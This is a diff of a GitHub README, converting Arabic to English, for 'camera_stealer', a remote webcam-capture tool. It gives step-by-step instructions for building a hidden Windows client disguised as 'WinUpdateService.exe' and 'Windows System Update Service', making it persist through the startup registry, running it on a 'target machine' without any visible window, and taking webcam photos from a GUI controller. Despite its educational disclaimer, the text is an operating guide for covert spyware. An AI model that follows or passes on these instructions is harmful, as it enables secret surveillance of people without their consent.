@@ -1,97 +1,243 @@
-######################################################
-# أداة التحكم في الكاميرا عن بعد (Camera Control Tool)
-######################################################
+<p align="center">
+  <img src="https://img.shields.io/badge/Python-3.8%2B-blue?style=for-the-badge&logo=python&logoColor=white" alt="Python 3.8+">
+  <img src="https://img.shields.io/badge/License-MIT-green?style=for-the-badge" alt="MIT License">
+  <img src="https://img.shields.io/badge/Platform-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white" alt="Windows">
+  <img src="https://img.shields.io/badge/GUI-PyQt5-41CD52?style=for-the-badge&logo=qt&logoColor=white" alt="PyQt5">
+  <img src="https://img.shields.io/badge/Encryption-SSL%2FTLS-red?style=for-the-badge&logo=letsencrypt&logoColor=white" alt="SSL/TLS">
+</p>
 
-مرحبًا بك في أداة التحكم في الكاميرا عن بعد. هذا المشروع يوفر نظامًا متكاملًا للتحكم بكاميرا الويب لجهاز كمبيوتر (العميل) من جهاز آخر (الخادم) عبر اتصال آمن ومشفر.
+# 📷 Remote Camera Control Tool
 
-==================
-محتويات المجلد
-==================
+A client-server application for **remote webcam capture** over an encrypted SSL/TLS connection. Built with Python, featuring a modern PyQt5 GUI for the server and a lightweight, persistent client agent for Windows.
 
--   `server.py`: الخادم (المتحكم) - البرنامج الذي تشغله على جهازك للتحكم.
--   `client.py`: ملف المصدر للعميل - يستخدم لتوليد الملف التنفيذي بعد تعديله (مطلوب فقط لعملية البناء).
--   `client.exe`: العميل (الهدف) - الملف التنفيذي الجاهز الذي ترسله وتُشغّله على الجهاز الآخر.
--   `server.crt` & `server.key`: ملفات الشهادة والمفتاح الخاص للتشفير (ضرورية لعمل الخادم).
+> ⚠️ **Disclaimer:** This tool is developed strictly for **educational and authorized security research purposes**. Unauthorized use of this software against systems you do not own or have explicit permission to test is **illegal** and **unethical**. The author assumes no liability for misuse.
 
-==========
-الميزات
-==========
+---
 
--   واجهة رسومية سهلة: يوفر الخادم واجهة تحكم بديهية لإدارة العملاء.
--   اتصال آمن: جميع الاتصالات بين الخادم والعميل مشفرة باستخدام SSL/TLS.
--   ثبات تلقائي (Persistence): العميل يقوم بتثبيت نفسه تلقائيًا في نظام ويندوز ليعمل مع كل إعادة تشغيل.
--   يعمل في الخفاء: لا تظهر أي نوافذ أو أيقونات عند تشغيل العميل على الجهاز الهدف.
--   دعم عملاء متعددين: يمكن للخادم إدارة الاتصال مع عدة أجهزة في نفس الوقت.
+## ✨ Features
 
-=============
-المتطلبات
-=============
+| Feature | Description |
+|---|---|
+| 🖥️ **Modern GUI** | Sleek PyQt5-based control panel for managing connected clients |
+| 🔒 **SSL/TLS Encryption** | All communications are encrypted using SSL/TLS certificates |
+| 📸 **Remote Webcam Capture** | Capture images from client webcams with a single click |
+| 💾 **Image Saving** | Save captured images locally with timestamps |
+| 👥 **Multi-Client Support** | Manage and control multiple connected clients simultaneously |
+| 🔄 **Auto-Reconnect** | Client automatically reconnects if the connection is lost |
+| 🏃 **Auto-Persistence** | Client registers itself in Windows startup registry |
+| 👻 **Stealth Mode** | Client runs silently in the background with no visible window |
+| ❤️ **Keep-Alive** | Built-in heartbeat mechanism to maintain stable connections |
 
--   **على جهاز الخادم (جهازك):**
-    يجب تثبيت مكتبة الواجهة الرسومية:
-    pip install -r requirements.txt
+---
 
--   **على جهاز العميل (الجهاز الهدف):**
-    لا توجد متطلبات. الملف التنفيذي (`WinUpdateService.exe`)  يعمل بشكل مستقل.
+## 📁 Project Structure
 
-=========================
-دليل الاستخدام السريع
-=========================
+```
+camera_stealer/
+├── server.py            # Server application with PyQt5 GUI
+├── client.py            # Client agent source code
+├── server.crt           # SSL certificate for encrypted communication
+├── server.key           # SSL private key
+├── requirements.txt     # Python dependencies
+├── LICENSE              # MIT License
+├── USAGE.md             # Detailed usage guide
+└── .gitignore           # Git ignore rules
+```
 
-### الخطوة 1: تشغيل الخادم (`server.py`)
+---
 
-1.  على جهازك (المتحكم)، تأكد من وجود `server.py`, `server.crt`, `server.key` في نفس المجلد.
-2.  افتح الطرفية (Command Prompt) في هذا المجلد وقم بتشغيل الأمر:
-    python server.py
-3.  ستفتح واجهة التحكم الرسومية، وسيكون الخادم الآن جاهزًا لاستقبال الاتصالات.
-    
+## 🔧 Architecture
 
-### الخطوة 2: تشغيل العميل (`WinUpdateService.exe`)  على الجهاز الهدف
+```
+┌──────────────────────┐          SSL/TLS          ┌──────────────────────┐
+│     SERVER (You)      │◄────────────────────────►│   CLIENT (Target)     │
+│                       │                           │                       │
+│  • PyQt5 GUI          │   ┌─────────────────┐    │  • Webcam capture     │
+│  • Client management  │   │  Encrypted Link  │    │  • Auto-reconnect    │
+│  • Image viewer       │   │  Port 5555       │    │  • Persistence       │
+│  • Save to disk       │   └─────────────────┘    │  • Stealth operation  │
+└──────────────────────┘                           └──────────────────────┘
+```
 
+### Communication Protocol
 
+| Message Type | Direction | Description |
+|---|---|---|
+| `SYS_INFO` | Client → Server | System info (`username@hostname`) sent on connection |
+| `PING` | Client → Server | Keep-alive heartbeat (every 20s) |
+| `take_picture` | Server → Client | Command to capture a webcam image |
+| `IMG_DATA` | Client → Server | Captured JPEG image data |
 
-=====================================================
-قسم المطورين: كيفية بناء ملف `(`WinUpdateService.exe`) ` بنفسك
-=====================================================
+---
 
-إذا أردت تغيير إعدادات العميل (مثل عنوان الخادم) أو إعادة بناء الملف التنفيذي، اتبع الخطوات التالية:
+## 🚀 Quick Start
 
-### 1. تثبيت متطلبات البناء
+### Prerequisites
 
-على جهاز التطوير الخاص بك، ستحتاج إلى تثبيت المكتبات التالية:
+| Component | Requirement |
+|---|---|
+| **Python** | 3.8 or higher |
+| **Server OS** | Windows / Linux / macOS |
+| **Client OS** | Windows (uses `winreg` for persistence) |
+| **Network** | Both machines must be reachable over the network |
+
+### 1. Clone the Repository
+
+```bash
+git clone https://github.com/EsmailAlansi/camera_stealer.git
+cd camera_stealer
+```
+
+### 2. Install Dependencies
+
+```bash
+pip install -r requirements.txt
+```
+
+### 3. Configure the Server IP
+
+Edit `server.py` and `client.py` to set your server's IP address:
+
+```python
+# In both server.py and client.py
+SERVER_HOST = "192.168.0.103"  # ← Replace with your server IP
+SERVER_PORT = 5555
+```
+
+### 4. Run the Server
+
+```bash
+python server.py
+```
+
+The GUI control panel will open, ready to accept incoming client connections.
+
+### 5. Run the Client (on target machine)
+
+```bash
+python client.py
+```
+
+Or build a standalone executable:
+
+```bash
+pyinstaller --onefile --noconsole --name "WinUpdateService" client.py
+```
+
+The compiled executable will be in the `dist/` folder.
+
+---
+
+## 🖥️ Server GUI
+
+The server provides an intuitive control panel with:
+
+- **Connected Clients List** — Shows all active client connections with `username@hostname`
+- **Control Panel** — Select a client and capture webcam images
+- **Image Viewer** — View captured images in a popup dialog with save functionality
+
+---
+
+## ⚙️ Configuration
+
+### Server Settings (`server.py`)
+
+```python
+HOST = '192.168.0.103'   # Server bind address
+PORT = 5555               # Server listening port
+```
+
+### Client Settings (`client.py`)
+
+```python
+SERVER_HOST = "192.168.0.103"   # Server IP to connect to
+SERVER_PORT = 5555               # Server port
+RECONNECT_DELAY = 15             # Seconds between reconnection attempts
+KEEP_ALIVE_INTERVAL = 20         # Seconds between heartbeat pings
+REGISTRY_KEY_NAME = "Windows System Update Service"  # Startup registry entry name
+```
+
+### SSL Certificates
+
+The project includes self-signed certificates (`server.crt` and `server.key`). To generate new ones:
+
+```bash
+openssl req -x509 -newkey rsa:2048 -keyout server.key -out server.crt -days 365 -nodes
+```
+
+---
+
+## 🔨 Building the Client Executable
+
+To create a standalone `.exe` that runs without Python installed:
+
+```bash
+# Install build dependencies
 pip install opencv-python pyinstaller
 
-### 2. تعديل ملف `client.py`
+# Build the executable
+pyinstaller --onefile --noconsole --name "WinUpdateService" client.py
+```
 
-1.  افتح ملف `client.py` باستخدام محرر نصوص.
-2.  ابحث عن إعدادات الاتصال وقم بتعديلها:
-    SERVER_HOST = "your_server_ip_or_domain"  # استبدل هذا بـ IP الخادم
-    SERVER_PORT = 5555                        # تأكد من أن المنفذ يطابق الخادم
+| Flag | Purpose |
+|---|---|
+| `--onefile` | Bundle everything into a single executable |
+| `--noconsole` | Hide the console window (stealth mode) |
+| `--name` | Set the output executable name |
 
-3.  يمكنك أيضًا تغيير اسم الخدمة الذي سيظهر في سجل النظام:
-    REGISTRY_KEY_NAME = "Windows System Update Service" # غيره حسب رغبتك
+The executable will be created at `dist/WinUpdateService.exe`.
 
-4.  احفظ الملف بعد إجراء التعديلات.
+---
 
-### 3. بناء الملف التنفيذي (`.exe`)
+## 📋 Requirements
 
-1.  افتح الطرفية (Command Prompt) في المجلد الذي يحتوي على `client.py`.
-2.  نفذ الأمر التالي لبناء الملف التنفيذي:
-    pyinstaller --onefile --noconsole --name "WinUpdateService" client.py
+```
+PyQt5              # Server GUI framework
+opencv-python      # Webcam capture (client-side)
+pyinstaller        # Build standalone executable (optional)
+```
 
-    -   `--onefile`: لإنشاء ملف تنفيذي واحد.
-    -   `--noconsole`: (مهم جدًا) لإخفاء النافذة السوداء عند التشغيل.
-    -   `--name "WinUpdateService"`: لتحديد اسم الملف التنفيذي الناتج.
+---
 
-3.  بعد انتهاء العملية، ستجد الملف التنفيذي الجديد (`WinUpdateService.exe`) داخل مجلد جديد باسم `dist`. هذا هو الملف الذي توزعه.
+## ⚠️ Legal Disclaimer
 
-1.  انقل ملف `(`WinUpdateService.exe`) ` إلى الجهاز الهدف.
-2.  قم بتشغيل الملف. بمجرد النقر عليه مرتين، سيعمل البرنامج في الخلفية دون أن تظهر أي نافذة.
-3.  سيقوم العميل تلقائيًا بالاتصال بالخادم وتثبيت نفسه في النظام ليبدأ مع كل إعادة تشغيل.
+This software is provided for **educational purposes only**. It is intended to demonstrate:
 
-### الخطوة 3: التحكم والتقاط الصور
+- Client-server socket programming
+- SSL/TLS encrypted communication
+- GUI development with PyQt5
+- Windows system integration concepts
 
-1.  عندما ينجح العميل في الاتصال، سيظهر اسمه في قائمة "Connected Clients" في واجهة الخادم.
-2.  انقر على اسم العميل لتحديده.
-3.  اضغط على زر "Capture Webcam Image" لإرسال أمر التقاط الصورة.
-4.  ستظهر نافذة جديدة تحتوي على الصورة الملتقطة، مع زر لحفظها على جهازك.
+**Do NOT use this tool for unauthorized access.** Always obtain explicit written permission before testing on any system. The author is not responsible for any misuse or damage caused by this software.
+
+---
+
+## 🤝 Contributing
+
+Contributions are welcome! Please:
+
+1. Fork the repository
+2. Create a feature branch (`git checkout -b feature/your-feature`)
+3. Commit your changes (`git commit -m "Add: description"`)
+4. Push to the branch (`git push origin feature/your-feature`)
+5. Open a Pull Request
+
+---
+
+## 📄 License
+
+This project is licensed under the **MIT License** — see the [LICENSE](LICENSE) file for details.
+
+---
+
+## 👤 Author
+
+**Esmail AL-ansi**
+
+- GitHub: [@EsmailAlansi](https://github.com/EsmailAlansi)
+
+---
+
+<p align="center">
+  <sub>Built with ❤️ for cybersecurity education and research</sub>
+</p>
